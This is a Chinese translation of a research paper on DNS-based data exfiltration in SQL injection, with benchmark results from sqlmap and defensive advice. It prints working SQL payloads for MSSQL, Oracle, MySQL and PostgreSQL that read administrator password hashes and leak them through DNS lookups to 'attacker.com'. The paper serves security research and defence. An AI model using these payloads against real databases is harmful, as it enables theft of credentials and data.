# 在SQL注入中使用DNS获取数据

0x00 前言
=======

* * *

原文地址: http://arxiv.org/ftp/arxiv/papers/1303/1303.3047.pdf

原文作者: Miroslav Štampar

本文描述了一种利用DNS解析过程获取恶意SQL查询结果的先进的SQL注入技术。带有sql查询结果的DNS请求最终被攻击者控制的远程域名服务器拦截并提取出宝贵的数据。

开源SQL注入工具—SqlMap现在已经可以自动完成这个任务。随着SqlMap的升级完成，攻击者可以使用此技术进行快速而低调的数据检索，尤其是在其他标准方法失败的情况下。

0x01 介绍
=======

* * *

渗出是一个军事术语，指的是通过隐蔽手段从敌人的领土内部盗取资产。如今它在计算机上有一个绝佳的用法，指的是非法从一个系统中提取数据。从域名服务器（DNS）中提取数据的方法被认为是最隐蔽的渗出方法。这种方法甚至可以通过一系列的信任主机以外的内部和外部域名服务器进行域名查询而用于没有公共网络连接的系统。

DNS是一个相对简单的协议。DNS客户端发送的查询语句和相应的DNS服务器返回的响应语句都使用相同的基本的DNS消息格式。除了区传送为提高其可靠性使用TCP以外，DNS报文都使用UDP封装。如果有人使用了Wireshark之类的工具监视机器，一个使用了DNS的隐蔽信道看起来像一系列转瞬即逝的小光点。

从安全系统中转播DNS查询到任意基于互联网的域名服务器是实现这一不受控制数据信道的基础。即使我们假设目标主机不被允许连接到公共网络，如果目标主机能够解析任意域名，数据还是可能可以经由转发DNS查询而渗出。

当其他更快的SQL注入（SQLI）数据检索技术失败时，攻击者通常会使用逐位检索数据的方法，这是一个非常繁杂而费时的流程。因此，攻击者通常需要发送成千上万的请求来获取一个普通大小的表的内容。我们将要 提到的是一种攻击者通过利用有漏洞数据库管理系统（DBMS）发起特制的DNS请求，并在另一端进行拦截来检索恶意SQL语句结果（例如管理员密码），每个循环可传输几十个结果字符的技术。

0x02 技术分类
=========

* * *

根据用于数据检索的传输信道，SQLi可分为三个独立的类别：inband, inference（推理） 和out-of-band。

Inband技术使用攻击者和有漏洞的Web应用程序之间现有的渠道来提取数据。通常该通道是标准的Web服务器响应。它的成员union技术使用现有的web页面输出恶意SQL查询的执行结果，而error-based技术则引发特定的恶意SQL查询的执行结果的DBMS的错误消息。

相反的，在Inference技术中，攻击者通过应用程序表现的差异来推断数据的值。Inference技术能够逐位提取恶意SQL查询结果，却没有真正传输数据。

Inference的核心是在服务器执行一系列的布尔查询，观察和最后推导接收结果的含义。根据观察到的特性，它的成员被称为布尔型盲注（bool）和基于时间（time-based）的盲注技术。在布尔型盲注技术中，可见的网络服务器响应内容的变化被用于区分给定的逻辑问题的答案，

而在基于时间的盲注技术中则通过观察Web服务器响应时间的变化来推断答案。

Out-of-band (OOB)技术，与inband相反，使用其它传输信道获取数据，例如超文本传输协议和DNS解析协议。当详细的错误信息被禁用、结果被限制或过滤、出站过滤规则不严和/或当减少查询的数目变得极度重要时inference技术看起来像是唯一的选择，这时使用OOB技术渗透便变得十分有趣。例如，基于HTTP的OOB技术的SQL查询结果变成了发送给HTTP服务器请求的一部分（例如GET参数值）被能访问日志文件的攻击者控制时。此类的技术不像其它的主流技术被广泛应用，主要是其所需的设置非常复杂，但使用它们可以克服许多障碍（如避免不必要的数据库写入和极大地提升利用INSERT/UPDATE语句漏洞的基于时间的SQLI）。

0x03 DNS解析
==========

* * *

当一个客户端需要查找程序中使用的网络名时，它会查询DNS服务器。DNS查询有许多不同的解析方式：

*   如果信息已经被预先用相同的查询获得，客户端可以使用本地缓存信息应答查询。
    
*   DNS服务器可以使用其自己的高速缓存和/或区记录的信息来应答查询 - 这个过程被称为迭代。
    
*   DNS服务器也可以转发查询给代表所请求的客户端的其他DNS服务器以全面解析名称，然后将回应发送回客户端 - 这个过程被称为递归。
    

![enter image description here](http://drops.javaweb.org/uploads/images/fbfd125c1d67d8ceb82ba8f32a7d83a29f4e7ca7.jpg)

例如，使用递归过程解析名称test.example.com。这种情况发生于DNS服务器和客户端都是第一次启动且没有能用来解析域名查询的本地缓存信息。此外，假设客户端发起的域名查询是一个本地没有其配置区域信息的域名。

首先，默认的DNS服务器解析域名的全名并且确定该域名是一个需要知道地址的权威的顶级域名（TLD）服务器--在这个案例的域名中。然后，它使用迭代（非递归）查询该服务器来获得推荐的example.com域。

当它的地址被完成检索后，被引用的服务器会被联接--这实际上是一个注册example.com域的域名服务器。因为它所配置的区域包含了查询的域名，它会将所得到的IP地址作为一个权威响应返回给发起该过程的原始服务器。

当原始的DNS服务器接收到所请求的查询所获得的权威响应，它转发该响应回客户端，递归查询过程结束。 这类的解决方案通常由DNS服务器尝试解析DNS客户端发起的递归域名查询时发起的，并且有时被称为“遍历树”（walking the tree）。

0x04 引发DNS请求
============

* * *

成功利用DNS从有漏洞的数据库中渗出数据的前提条件是DBMS中有可用的能直接或间接引发DNS解析过程的子程序。 然后这类的子程序被攻击者利用，作为攻击的媒介。

任何可以接受网络地址的函数是最有可能被利用来进行这种攻击的。

 4.1 Microsoft SQL Server
-------------------------

* * *

扩展存储程序是一个直接运行在微软的地址空间库SQL服务器（MSSQL）的动态链接。有几个未被公开说明的扩展存储程序对于实现本文的目的特别有用的。

攻击者可以使用Microsoft Windows通用命名约定（UNC）的文件和目录路径格式利用任何以下扩展存储程序引发DNS地址解析。Windows系统的UNC语法具有通用的形式： 

```
\\ComputerName\SharedFolder\Resource

```

攻击者能够通过使用自定义制作的地址作为计算机名字段的值引发DNS请求。

4.1.1 master..xp_dirtree

扩展存储程序master..xp_dirtree（）用于获取所有文件夹的列表和给定文件夹内部的子文件夹：

```
 master..xp_dirtree '<dirpath>'

```

例如，要获得C:\Windows run:里的所有文件夹和子文件夹：

```
 EXEC master..xp_dirtree 'C:\Windows';     

```

4.1.2 master..xp_fileexist

扩展存储程序master..xp_fileexist（）用于确定一个特定的文件是否存在于硬盘： xp_fileexist '' 例如，要检查boot.ini文件是否存在于磁盘C 运行:

```
 EXEC master..xp_fileexist 'C:\boot.ini';

```

 4.1.3 master..xp_subdirs

扩展存储程序master..xp_subdirs（）用于得到给定的文件夹内的文件夹列表： 

```
master..xp_subdirs '<dirpath>'

```

例如，要获得C:\Windows中的所有次级文件夹: 

```
EXEC master..xp_subdirs 'C:\Windows';     

```

4.1.4例子

接下来的是的通过MsSQL的扩展存储程序master..xp_dirtree()将管理员（sa）的密码哈希通过DNS传输的例子。 

```
DECLARE @host varchar(1024);     

SELECT @host=(SELECT TOP 1 master.dbo.fn_varbintohexstr(password_hash) FROM sys.sql_logins WHERE name='sa')+'.attacker.com';
 EXEC('master..xp_dirtree "\\'+@host+'\foobar$"');

```

这种预先计算的形式被使用，因为扩展存储程序不接受带有参数的子查询。因而使用临时变量存储SQL查询的结果。

4.2 Oracle 
-----------

* * *

Oracle提供的PL/ SQL包被捆绑在它的Oracle数据库服务器来扩展数据库功能。为了实现本文的目的，其中几个用于网络接入的包让人特别感兴趣。

 4.2.1 UTL_INADDR.GET_HOST_ADDRESS

UTL_INADDR包用于互联网的寻址--诸如检索本地和远程主机的主机名和IP的地址。

它的成员函数GET_HOST_ADDRESS()用于检索特定主机的IP：

```
 UTL_INADDR.GET_HOST_ADDRESS('<host>')

```

例如，为了获得test.example.com的IP地址，运行： 

```
SELECT UTL_INADDR.GET_HOST_ADDRESS('test.example.com');     

```

4.2.2 UTL_HTTP.REQUEST

UTL_HTTP包用于从SQL和PL/SQL中标注出HTTP。 它的程序REQUEST()回从给定的地址检索到的第1-2000字节的数据： UTL_HTTP.REQUEST('')

例如，为了获得http://test.example.com/index.php页面的前两千字节的数据，运行：

```
 SELECT UTL_HTTP.REQUEST('http://test.example.com/index.php') FROM DUAL;     

```

4.2.3 HTTPURITYPE.GETCLOB

HTTPURITYPE类的实例方法GETCLOB()返回从给定地址中检索到的CLOB（Character Large Object） HTTPURITYPE('').GETCLOB()

例如，从页面http://test.example.com/index.php开始内容检索 运行：

```
 SELECT HTTPURITYPE('http://test.example.com/index.php').GETCLOB() FROM DUAL;

```

4.2.4 DBMS_LDAP.INIT

DBMS_LDAP包使得PL/SQL程序员能够访问轻量级目录访问协议（LDAP）服务器。它的程序INIT()用于初始化与LDAP服务器的会话： DBMS_LDAP.INIT(('',)

例如：初始化与主机test.example.com的连接 运行：

```
 SELECT DBMS_LDAP.INIT(('test.example.com',80) FROM DUAL;

```

攻击者可以使用任何以上提到的Oracle子程序发起DNS请求。然而，在Oracle 11g中，除了DBMS_LDAP.INIT()以外的所有可能导致网络访问子程序都受到限制。 

4.2.5例子

以下例子是系统管理员（SYS）的密码哈希被Oracle程序DBMS_LDAP.INIT（）通过DNS解析机制传输：

```
 SELECT DBMS_LDAP.INIT((SELECT password FROM SYS.USER$ WHERE name='SYS')||'.attacker.com',80) FROM DUAL;     

```

4.3 MySQL 
----------

* * *

4.3.1 LOAD_FILE

MySQL的函数LOAD_FILE()读取文件内容并将其作为字符串返回： LOAD_FILE('')

例如，要获取C:\Windows\system.ini文件的内容 运行：

```
 SELECT LOAD_FILE('C:\\Windows\\system.ini') ;     

```

4.3.2例子

以下是使用MySQL的函数LOAD_FILE()将系统管理员的密码通过DNS解析机制传输的例子： 

```
SELECT LOAD_FILE(CONCAT('\\\\',(SELECT password FROM mysql.user WHERE user='root'     LIMIT 1),'.attacker.com\\foobar'));

```

4.4 PostgreSQL
--------------

* * *

 4.4.1 COPY

PostgreSQL的声明COPY用于在文件系统的文件和表之间拷贝数据：

```
 COPY <table>(<column>,...) FROM '<path>'

```

例如，为了将C:\Windows\Temp\users.txt的文件内容拷贝到含有唯一列names的users表中 运行： 

```
COPY users(names) FROM 'C:\\Windows\\Temp\\users.txt'     

```

4.4.2例子 以下是使用PostgreSQL的声明COPY将系统管理员的密码通过DNS解析机制传输的例子：

```
 DROP TABLE IF EXISTS table_output;     

CREATE TABLE table_output(content text);

 CREATE OR REPLACE FUNCTION temp_function()     

RETURNS VOID AS $$

 DECLARE exec_cmd TEXT;     

DECLARE query_result TEXT;     

BEGIN     SELECT INTO query_result (SELECT passwd FROM pg_shadow WHERE usename='postgres');     

exec_cmd := E'COPY table_output(content)FROM E\'\\\\\\\\'||query_result||E'.attacker.com\\\\foobar.txt\'';

 EXECUTE exec_cmd;     END;     

$$ LANGUAGE plpgsql SECURITY DEFINER;

 SELECT temp_function();

```

这种预先计算的形式被使用，因为SQL的声明COPY不接受子查询。

同时，PostgreSQL的变量都必须被明确地声明并在子程序（函数或者程序）范围内使用。因此使用用户自定义的存储功能。

0x05 实施
=======

* * *

如前所述，我选择的工具SQL注入工具是SqlMap，主要是因为本文的作者也是它的开发者之一，并升级它使其支持DNS渗出。新的命令行选项--dns-domain已经被添加用于运行新的程序流程。有了它，用户可以打开DNS渗出的支持，并且通知SqlMap所有被引发DNS解析请求应指向给定域（例如--dns-domain=attacker.com）。

域名服务器条目（如ns1.attacker.com）必须包含一台正在运行SqlMap的机器的IP地址。

在那里，SqlMap作为虚假的名称服务器运行，提供有效（但假）的响应从而引发传入的DNS解析请求。虚假的返回响应服务被运行只是为了立刻解锁等待中的Web服务器，而不带有结果，因为程序不是在处理网页内容本身。

对于每一个被下载项目，SqlMap都会发送里面带有特制的SQLI DNS渗出向量的正常HTTP请求，而在后台运行和记录所有传入的DNS请求。由于每个恶意的SQL查询结果被独特的随机选择的前缀和后缀字符串封闭，不难分辨该DNS解析请求来自哪个SQLIDNS渗出向量。另外，由于那些随机的封闭字符，几乎所有的DNS缓存机制都失效了，几乎是在强迫服务器进行递归DNS解析。目前已经全面实现了对DBMSes MsSQL, Oracle, MySQL 和 PostgreSQL 的支持。但是，如前面提到的，只有Oracle能够同时支持Windows和Linux后端平台的攻击，因为其他数据库需要支持处理Windows UNC文件路径格式。

在SqlMap运行时，union和error-based技术具有最高优先级，主要因为他们的速度快而且不需要特殊的要求。

因此，只有当缓慢inference技术方法是可用的且选项--dns-domain被用户明确设置时，SqlMap才会打开对DNS渗出的支持。 每个DNS解析请求结果都被按照RFC1034规定的DNS域名标准编码为十六进制格式。

这种方式使得最终一切非单词字符都能被保留。此外，表示较长的SQL查询结果的十六进制被分割。这是必须做的，因为整个域名内的节点标签（如.example.）被限制在63个字符长度大小。

![enter image description here](http://drops.javaweb.org/uploads/images/e3a1edfe8a74b7d12ab9b2bfa7b142c242be3b81.jpg)

0x06 实验设置和结果
============

* * *

为了进行实验需要配置和使用三台机器：

 1)攻击机(172.16.138.1)-物理机

Ubuntu 12.04 LTS 64-bit OS running latest 

sqlmap v1.0-dev (r5100)12 

2) Web (172.16.138.129) –服务器-虚拟机

with Windows XP 32-bit SP1 OS running a XAMPP 1.7.3 instance containing deliberately SQLi vulnerable MySQL/PHP web application

 3) DNS服务器(172.16.138.130) –虚拟机

with CentOS 6.2 64-bit OS running a BIND

使用VMware Workstation 8.0.2制造虚拟环境。所有的测试都在本地虚拟网络(172.16.138.0/24)中进行。攻击机被用于攻击有漏洞的web服务器DNS服务器被用于注册域名服务器并处理web服务器对域名attacker.com的 DNS解析并将它们返回到攻击机。

所有的SqlMap支持的技术都进行了测试，包括最新实现支持的DNS渗出。HTTP请求的数量和所花费的时间都被系统的information_schema表记录、测量。COLLATIONS表用于被拖（大概4KB）。

表1.SQLI技术的速度对比

| Method | # of requests | Time (sec) |
| --- | :-: | --: |
| Boolean-based blind | 29,212 | 214.04 |
| Time-based (1 sec) | 32,716 | 17,720.51 |
| Error-based | 777 | 9.02 |
| Union (full/partial) | 3/136 | 0.70/2.50 |
| DNS exfiltration | 1,409 | 35.31 |

0x07 讨论
=======

* * *

从表1中给出的结果可以看出，inband技术（union和error-based）是最快的方法，而inference技术（布尔型盲注和基于时间的盲注）是最慢的。

DNS渗出，如预期那样，比最慢的inband（error-based）慢，但比最快的推断方法（布尔型盲注）快。

基于时间的盲注很明显太慢了。 现实中，因为连接的延迟和需要时间加载正常尺寸的页面，所有的技术注定会因每个请求的而有额外的延迟。

在使用SQLI攻击有漏洞页面时一个小的表会被返回，这使得连接读取得非常快。

此外，在现实生活中的场景中，不必要的连接延迟将引起time-based技术需要更高的延迟时间，使得dump进程更慢。

在真实的生活场景中还有一个事实是，DNS渗出的技术在使用非本地的DNS服务器将有额外的延迟。

然而，它和inference技术之间差别仍然很大，因为后者需要更多的时间去恢复相同的数据将需要更多的时间来检索，而为了得到相同的数据后者必然有更多的请求。

总而言之，DNS渗出技术的数值看起来更好一点，使其成为inference方法的一个完美的替代品。

![enter image description here](http://drops.javaweb.org/uploads/images/16cd4757e30570f786e420e00460e704ddfd2bbb.jpg)

图3： 捕获到的SqlMap使用DNS渗出时的流量

0x08 防范技巧
=========

* * *

 为了预防所本文描述的攻击，首先要避免SQLI具有最高的优先权。

使用预处理语句被认为是最安全的预防措施。

预处理语句能在SQL命令被插入的时候确保查询的意图不被攻击者改变。 

但像magic_quote()和addslashes()那样的各种禁制机制并不能完全防止SQLI漏洞的存在或利用，因为在某些技术配合使用的环境条件下，攻击者仍能利用该漏洞。

相反，如果不使用预处理语句，推荐使用输入校检拒绝恶意的输入，而不是转义或修饰。

管理员应该准备好应对未经授权的底层数据库访问。

好多反击措施是将所有数据库的访问限制在最低权限。

因此，任何给定的权限应该被授予最少的代码在最短的持续时间内完成工作。

根据这一原则，用户必须只能获得必要的信息和资源。

最后一步，为了成功最后缓解DNS渗出攻击，管理员必须确保所有不必要的系统子程序的执行是被限制的。

如果一切都失败了，攻击者必须不能够运行那些可以发起DNS请求的程序。

现在有一些检测域内DNS流量中恶意活动的工作，但大多缺乏实际和主流的解决方案，所以在这里并不提及。 9总结 本文证明攻击者如何使用DNS渗出技术大大加快相对缓慢的inference SQLI技术的数据检索。

此外，该技术只对有漏洞的Web服务器进行必需的请求，从而大幅降低服务器的繁忙程度。

由于需要控制域名服务器，它可能不会被多数攻击者所使用。

但它再实施上很简单的，因此它的实际价值是不可忽略的。

SqlMap已经对它实现支持，因此所有人都可以对它进行进一步研究。

0x09 参考文献
=========

* * *

1 sqlmap – automatic SQL injection and database takeover tool, Bernardo Damele A. G., Miroslav Štampar, http://www.sqlmap.org/ 

2 Exfiltration: How Hackers Get the Data Out, Jart Armin, May 2011, http://news.hostexploit.com/cybercrimenews/4877-exfiltration-how-hackers-get-thedata-out.html 

3 Wireshark - network protocol analyzer, Wireshark Foundation,https://www.wireshark.org/ 

4 The Rootkit Arsenal: Escape and Evasion in the Dark Corners of the System, Bill Blunden, WordWare Publishing, Inc., 2009

5 DNS as a Covert Channel Within Protected Networks,Seth Bromberger , National Electric Sector Cyber Security Organization (NESCO), January 2001,http://energy.gov/sites/prod/files/oeprod/DocumentsandMedia/DNS_Exfiltration_2011-01-01_v1.1.pdf 

6 Data-mining with SQL Injection and Inference, DavidLitchfield, An NGSSoftware Insight Security Research Publication, September 2005,http://www.nccgroup.com/Libraries/Document_Downloads/Data Mining_With_SQL_Injection_and_Inference.sflb.ashx 

7 Advanced SQL Injection, Joseph McCray, February 2009,http://www.slideshare.net/joemccray/AdvancedSQLInjectionv2

8 SQL Injection and Data Mining through Inference,David Litchfield, BlackHat EU, 2005, https://www.blackhat.com/presentations/bheurope-05/bh-eu-05-litchfield.pdf 

9 SQL – Injection & OOB – channels, Patrik Karlsson,DEF CON 15, August 2007,https://www.defcon.org/images/defcon15/dc15-presentations/dc-15-karlsson.pdf 

10 The TCP/IP Guide: A Comprehensive, Illustrated Internet Protocols Reference, Charles M. Kozierok, NoStarch Press, 2005

11 How DNS query works, Microsoft TechNet, January 2005,http://technet.microsoft.com/en us/library/cc775637(v=ws.10).aspx 

12 Microsoft Windows 2000 DNS: Implementation and Administration, Kevin Kocis, Sams Publishing, 2001 

13 Useful undocumented extended stored procedures,Alexander Chigrik, 2010,http://www.mssqlcity.com/Articles/Undoc/UndocExtSP.htm 

14 Oracle9i XML API Reference - XDK and OracleXML DB (Release 2), Oracle Corporation, March 2002,http://docs.oracle.com/cd/B10501_01/appdev.920/a96616.pdf 

15 Hacking Oracle From Web Apps, Sumit Siddharth,Aleksander Gorkowienko, 7Safe, DEF CON 18,November 2010,https://www.defcon.org/images/defcon-18/dc18-presentations/Siddharth/DEFCON-18-Siddharth-Hacking-Oracle-From-Web.pdf

 16 Exploiting PL/SQL Injection With Only CREATE SESSION Privileges in Oracle 11g, David Litchfield, AnNGSSoftware Insight Security Research Publication,October 2009, http://www.databasesecurity.com/ExploitingPLSQLinOracle11g.pdf

17 RFC 1034: Domain Names – Concepts andFacilities, Paul Mockapetris, November 1987,https://www.ietf.org/rfc/rfc1034.txt

 18 SQL Injection Prevention Cheat Sheet, Open Web Application Security Project, March 2012,https://www.owasp.org/index.php/SQL_Injection_Prevention_Cheat_Sheet 

19 Parametrized SQL statement, Rosetta Code, August 2011,http://rosettacode.org/wiki/Parametrized_SQL_statement

20 SQL Injection Attacks and Defense, Justin Clarke,Syngress, 2009 

21 addslashes() Versus mysql_real_escape_string(),Chris Shiflett, January 2006,http://shiflett.org/blog/2006/jan/addslashes-versus-mysql-real-escape-string 

22 Advanced SQL Injection, Victor Chapela, Sm4rtSecurity Services, OWASP, November 2005,https://www.owasp.org/images/7/74/Advanced_SQL_Injection.ppt 

23 Security Overview (ADO.NET), MSDN, Microsoft,2012.,http://msdn.microsoft.com/enus/library/hdb58b2f.aspx 

24 The Web Application Hacker's Handbook: Findingand Exploiting Security Flaws, Dafydd Stuttard, MarcusPinto, John Wiley & Sons, 2011 

25 Detecting DNS Tunnels Using Character Frequency Analysis, Kenton Born, Dr. David Gustafson, Kansas State University, April 2010,http://arxiv.org/pdf/1004.4358.pdf

26 Finding Malicious Activity in Bulk DNS Data, EdStoner, Carnegie Mellon University, 2010, www.cert.org/archive/pdf/research-rpt2009/stoner-mal-act.pdf